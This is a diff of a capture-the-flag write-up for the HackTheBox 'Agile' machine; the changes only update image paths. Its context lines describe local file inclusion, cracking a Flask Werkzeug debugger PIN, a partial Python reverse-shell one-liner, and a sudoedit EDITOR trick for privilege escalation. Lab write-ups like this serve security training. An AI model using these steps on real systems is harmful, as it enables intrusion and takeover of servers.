@@ -30,19 +30,19 @@ After having added superpass.htb to my `/etc/hosts` file, I headed to the site.
 
 This is the home page:
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_home.png)
+![](../../../assets/CTFs/HackTheBox/agile_home.png)
 
 Let's create an account and see what it does.
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_vault.png)
+![](../../..//assets/CTFs/HackTheBox/agile_vault.png)
 
 It seems like a application for password management to me. The export button will export our saved passwords as a csv file and allow us to download the file. This function can be a flaw in the system if implemented poorly. We can intercept the request to gain understanding of this function.
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_export.png)
+![](../../..//assets/CTFs/HackTheBox/agile_export.png)
 
 With the username `abc`, the file is generated under the form `USERNAME_export_RANDOMSTRING`. Let's try to get the /etc/passwd file with LFI.
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_lfi.png)
+![](../../..//assets/CTFs/HackTheBox/agile_lfi.png)
 
 ```bash
 $cat superpass_export.csv 
@@ -87,13 +87,13 @@ We found the user `corum`, `edwards` and `dev_admin`. With LFI, we get access to
 
 A failed login results in this error. So this is an application written with Python Flask with SQL Alchemy. These two often comes with each others.
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_faillogin.png)
+![](../../..//assets/CTFs/HackTheBox/agile_faillogin.png)
 
 One thing interesting about Python Flask is that it allows developer to execute command remotely in debug mode to debug the application. This console is protected by a PIN, which can be replicated if we have enough information on the system.
 
 We can try activate the console on clicking at the terminal symbol on the right end of the traceback bar.
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_console.png)
+![](../../..//assets/CTFs/HackTheBox/agile_console.png)
 
 This is a Werkzeug Debugger. Looking for  `Werkzeug Debugger vulnerabilities` with Google, I found [this amazing article](https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/) explaining how the PIN is generated, and on combining with LFI, we can crack it as follows:
 
@@ -134,7 +134,7 @@ I always find LFI with the `/proc` directory useful for case like this. We can g
 
 Or alternatively, we can use `getattr(app, '__name__', getattr (app .__ class__, '__name__'))`
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_user.png)
+![](../../..//assets/CTFs/HackTheBox/agile_user.png)
 
 The user is `www-data`.
 
@@ -146,13 +146,13 @@ We can download the `app.py` file and see that the module name is by default `fl
 
 Thanks to the debug information, we can also know that the application working dir is `/app/venv/lib/python3.10/site-packages/flask/app.py` and the application name is `wsgi_app`
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_wsgiapp.png)
+![](../../..//assets/CTFs/HackTheBox/agile_wsgiapp.png)
 
 #### Private_bits
 
 MAC: `/proc/net/arp` to get the interface and then `/sys/class/net/eth0/address` to get the MAC `00:50:56:b9:da:2c`
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_eth0.png)
+![](../../..//assets/CTFs/HackTheBox/agile_eth0.png)
 
 ```python
 >>>print(0x005056b9da2c)
@@ -250,7 +250,7 @@ python3 ./pin_cracker.py
 
 And it worked!! The console is ready to go:
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_pincracked.png)
+![](../../..//assets/CTFs/HackTheBox/agile_pincracked.png)
 
 Now we can make a reverse shell to our machine.
 
@@ -268,7 +268,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 >
 > More details [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_wwwdata.png)
+![](../../..//assets/CTFs/HackTheBox/agile_wwwdata.png)
 
 We have access as user `www-data`.
 
@@ -329,13 +329,13 @@ Now all traffic to port 8000 on my attacking machine will be forwarded to port 4
 
 At `chrome://inspect/?search=discover#devices`, add our port 8000 to the `network targets`
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_port8000.png)
+![](../../..//assets/CTFs/HackTheBox/agile_port8000.png)
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_remote.png)
+![](../../..//assets/CTFs/HackTheBox/agile_remote.png)
 
 It was detected as SuperPassword application. Now we can `inspect` it and get the password of `edwards`
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_edwards.png)
+![](../../..//assets/CTFs/HackTheBox/agile_edwards.png)
 
 The user `edwards` can use sudo as `dev_admin`:
 
@@ -378,7 +378,7 @@ export EDITOR="vi -- /app/venv/bin/activate"
 sudo -u dev_admin sudoedit /app/config_test.json
 ```
 
-![](/home/meta9/thng01.github.io/assets/CTFs/HackTheBox/agile_vim.png)
+![](../../..//assets/CTFs/HackTheBox/agile_vim.png)
 
 And we got into the `activate` file. Now we can modify it to whatever we want. I just simply leak the content of root.txt and that's it!
 
